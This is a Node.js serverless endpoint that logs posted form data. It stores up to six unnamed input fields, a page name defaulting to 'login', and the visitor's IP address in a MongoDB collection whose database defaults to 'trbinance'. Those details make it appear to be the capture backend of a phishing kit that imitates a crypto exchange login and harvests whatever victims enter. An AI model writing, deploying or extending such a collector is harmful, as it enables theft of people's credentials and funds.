const clientPromise = require('../lib/mongo');

async function readBody(req) {
  const chunks = [];
  return new Promise((resolve, reject) => {
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString() || '{}';
        resolve(JSON.parse(raw));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const body = await readBody(req);
    const {
      page = 'login',
      inputs = {}
    } = body || {};

    const ip = getClientIp(req);
    const now = new Date();
    const doc = {
      page: String(page || 'unknown').slice(0, 120),
      ip
    };

    for (let i = 1; i <= 6; i += 1) {
      const key = `input${i}`;
      const value = inputs[key];
      doc[key] = value !== undefined && value !== null ? String(value).slice(0, 512) : '';
    }

    const client = await clientPromise;
    const db = client.db(process.env.MONGODB_DB || 'trbinance');
    const logs = db.collection('formLogs');

    await logs.updateOne(
      { ip },
      {
        $set: {
          ...doc,
          updatedAt: now
        },
        $setOnInsert: { createdAt: now }
      },
      { upsert: true }
    );

    return res.status(201).json({ ok: true });
  } catch (err) {
    console.error('Form log error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};


